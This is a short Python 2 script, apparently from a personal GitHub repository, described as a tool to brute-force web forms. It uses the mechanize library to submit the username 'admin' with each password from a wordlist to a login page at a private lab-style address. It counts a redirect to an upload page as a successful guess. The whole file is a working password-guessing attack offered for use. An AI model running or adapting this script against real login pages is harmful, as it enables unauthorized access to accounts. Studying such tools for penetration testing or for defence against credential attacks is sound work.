#!/usr/bin/env python
"""
Author: @Anakein
Email: eduardobarbosa@protonmail.ch
Github: e-anakein/Form_Brute_Anakein/anakein_formbrute.py
Date: 05/05/2018

 ////// Tool to perform brute force on forms ///// 


"""

import mechanize

b = mechanize.Browser()
url = "http://10.10.10.73/login.php"
response = b.open(url)

wordlist = "wordlist.txt"

try:
    wordlist = open(wordlist, 'r')

except:
    print "Wordlist Not Found, please insert one wordlist.txt"
    quit()


for password in wordlist:
    b.select_form(nr=0)
    b.form['username'] = 'admin'
    b.form['password'] = password.strip()

    b.method = "POST"
    response = b.submit()

    if response.geturl() == "http://10.10.10.73/upload.php":
        print "[+] Password Found: " + password
        break


    else:
        print "[!] Password Not Found"


